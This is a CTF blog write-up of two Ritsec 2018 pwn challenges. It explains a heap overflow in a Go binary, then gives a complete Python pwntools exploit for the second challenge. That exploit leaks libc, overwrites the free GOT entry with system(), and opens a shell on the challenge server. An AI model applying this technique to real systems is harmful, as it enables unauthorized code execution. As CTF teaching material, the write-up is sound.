---
layout: post
title: "[Ritsec CTF 2018] Pwn challenges"
categories: ["write-up"]
tags: ["pwn", "exploit"]
---

Write-up of both pwn challenges `Gimme sum fud` and `Yet Another HR Management Framework` which are ELF binary compiled from Go lang. 

## Gimme sum fud

**Points:** 100 **Category:** Pwn **Author:** Dagger

### Introduction

In this challenge, we are given an ELF 64 bits binary. The binary is very simple, it read a string on its input and then display it.

Compare to a classic heap challenge, the binary size is a bit more huge. This challenge seem's to be classic but it is not. The binary size is 1.5 Megabytes! The binary is as huge because it is coded in `Go lang`.

![Function_list](/assets/media/pwn3_function_list.png)

Go lang load no more than `2053` functions in this binary! But we will not have to reverse every function. Only a few one will be useful for us.

Luckily for us, the binary is not stripped. In Go lang, after compilation, the main function is renamed `main.main`. This is the function that interests us.

### Vulnerability

The most important part of the `main.main` function is the one below:

![Main_function](/assets/media/pwn3_main_function.png)

The function can be summarized with the following steps:

- It allocates a buffer on the heap of size 0x10 ;
- It allocates a second buffer on the heap of size 0x64 ;
- It read the content of the file "flag.txt" in the second buffer ;
- It read 0x1337 bytes from the input in the first buffer ;
- It prints the first buffer ;

The vulnerability is a buffer overflow located on the heap.

From this point it is very easy to get the flag. We will send enough writable bytes to join the second buffer and when the binary will print the first buffer, it will also print the second one.

In Go lang, the heap seem's to be managed differently compare to a basic C/C++ binary. There is a huge padding between the first and the second buffer. The offset between both buffer is 1360 bytes.

### Exploit

Let test it:

![Exploit](/assets/media/pwn3_exploit.png)

We just need to add a 'R' at the beginning of the flag: `RITSEC{Muff1n_G0verFl0w_mmmm}`

Done.

PS: You can find the binary and the exploit [here](https://github.com/meffre-q/ctf/tree/master/2018/ritsec/binary/pwn3)

## Yet Another HR Management Framework

**Points:** 250 **Category:** Pwn **Author:** Dagger

### Introduction

In this challenge, we are given an ELF 64 bits binary. The binary is a bit more complicated than the previous one. 

```
$ ./pwn2 
Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice: 1

Creating a new person...
Enter name length: 20
Enter person's name: Toto
Enter person's age: 33

Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice: 3

Printing a person...
Enter person's index (0-based): 0
Name: Toto

Age: 33

Welcome to yet another human resources management framework!
============================================================
1. Create a new person
2. Edit a person
3. Print information about a person
4. Delete a person
5. This framework sucks, get me out of here!
Enter your choice: 4

Delete a person...
Enter person's index (0-based): 0
Done.
```

The binary allow us to manage a data structure on the heap which is named `person`. We can do the following action on the structure:
- Create a person ;
- Edit a person ;
- Print a person ;
- Delete a person ;

The structure should look something like this:
```c
struct person {
    void (*printPerson)(void);
    char *name;
    int age;
};
```

There is some garbage after these fields but it is useless for our exploit.

### Vulnerability

There are a lot of vulnerabilities in this exploit:
- In the `Edit person` function, the program doesn't check if the person targeted is free or not which can lead to a `Use After Free` ;
- In the `Edit person` function, there is no boundary check on the new given name size which lead to a `heap overflow` ;
- In the `Print person` function, the program doesn't check if the person targeted is free or not which can lead to either a `Use After Free` or a `Memory leak` ;
- In the `Delete person` function, the program doesn't check if the person targeted is free or not which can lead to a `Double free vulnerability` ;
- In the `Delete person` function, the program doesn't zero the pointer after freed it which gave us a dangling pointer and can lead to either a `Use After Free` or a `Memory leak` ;

In my exploit, I choose to use the memory leak located in the `Print person` function and the `heap overflow` located in the `Edit person` function. Using these vulnerabilities we can have a read/write primitive.

We must take care of the following protections:
- Partial RELRO is enabled, we can overwrite the entry's of the Global Offset Table ;
- Stack Smash Protection is enabled, the stack contain canary's ;
- NX is enabled, we can't execute shellcode on the stack/heap ;
- PIE is disabled, we don't need to leak the memory ;
- The source are FORTIFY, we don't care about it. :)

We will first leak the LibC, the exploit plan is the following:
- Allocate three chunks on the heap. The first and the third one gonna be fast bins whereas the second one gonna a small bin. The third chunk is only used to avoid consolidation of the small bin with the top chunk when it will be free.

Below is a picture of the heap layout after this step:

![Heap_layout](/assets/media/pwn3_heap_layout.png)

We are going to use the first `char *name` with the heap overflow vulnerability to overwrite the data contained in the `struct person[1]`.

Next steps to have a leak:
- Free the second chunk (small bin) to populate `free@got.plt` with the address of free() in the LibC.
- Edit the first chunk to overflow into the second freed chunk to overwrite the `name` address with the GOT address of free(). (We must take care of the function pointer located before the name address because the function is called when we trigger `Print person`)
- Call `Print person` to leak the LibC address of free().

Then we will call system("/bin/sh") using the following steps:
- Edit the first chunk, created before, to overwrite the address of name with the GOT address of free() ;
- Edit the second chunk to overwrite the GOT address of free() with the address of system() ;
- Edit again the first chunk to overwrite the address of the name with the one of "/bin/sh", obtained by leaking the LibC ;
- Delete again the second person to call free() and trigger system("/bin/sh") ;

### Exploitation

I use the following exploit to get the flag:
```py
#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *
import os


context(arch="i386", os="linux", endian="little")


class Pwn:
    def __init__(self):
        self.e = ELF("./pwn2")
        self.libc = ELF("./libc.so.6")
        self.p = None

    def start_binary(self):
        self.p = remote("fun.ritsec.club", 1337)
        self.p.recvuntil("choice: ")

    def create(self, length, name, age):
        self.p.sendline("1")
        self.p.recvuntil("length: ")
        self.p.sendline(str(length))
        self.p.recvuntil("name: ")
        self.p.sendline(name)
        self.p.recvuntil("age: ")
        self.p.sendline(str(age))
        self.p.recvuntil("choice: ")

    def edit(self, index, length, name):
        self.p.sendline("2")
        self.p.recvuntil("(0-based): ")
        self.p.sendline(str(index))
        self.p.recvuntil("length: ")
        self.p.sendline(str(length))
        self.p.recvuntil("name: ")
        self.p.sendline(name)
        self.p.recvuntil("choice: ")

    def view(self, index):
        self.p.sendline("3")
        self.p.recvuntil("(0-based): ")
        self.p.sendline(str(index))
        return self.p.recvuntil("choice: ")

    def delete(self, index):
        self.p.sendline("4")
        self.p.recvuntil("(0-based): ")
        self.p.sendline(str(index))
        self.p.recvuntil("choice: ")

    def exit(self):
        self.p.sendline("5")

    def leak_stack(self):
        offset="A"*24
        payload=offset+p32(self.e.symbols["printPerson"])+p32(self.e.got["free"])

        self.create(20, "A"*10, 20)
        self.create(180, "B"*10, 20)                                 # Allocate small bin
        self.create(20, "C"*10, 20)                                  # Avoid top chunk consolidation

        self.delete(1)                                               # Populate free@got.plt
        self.edit(0, 4000, payload)                                  # Heap overflow
        data=self.view(1)[6:10]                                      # UaF to Leak
        return u32(data)

    def exec_system(self, libc_base):
        offset="A"*28
        payload=offset+p32(self.e.got["free"])

        self.edit(0, 4000, payload)                                  # Overwrite name address with free@got.plt
        self.edit(1, 10, p32(libc_base+self.libc.symbols["system"])) # Overwrite free@got.plt with system()
        payload=offset+p32(libc_base+next(self.libc.search("/bin/sh\x00")))
        self.edit(0, 4000, payload)                                  # Overwrite name address with free@got.plt

        self.p.sendline("4")
        self.p.recvuntil("(0-based): ")
        self.p.sendline("1")                                         # Trigger system("/bin/sh")

        self.p.interactive()
        self.p.close()

    def pwn_binary(self):
        self.start_binary()

        libc_base=self.leak_stack()-self.libc.symbols["free"]
        log.info("Leak libc base address: "+hex(libc_base))
        self.exec_system(libc_base)


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
```

Let's try it:

![Flag](/assets/media/ritsec_flag.png)

Done.

PS: You can find the binary and the exploit [here](https://github.com/meffre-q/ctf/tree/master/2018/ritsec/binary/HR_Management/250/dist)
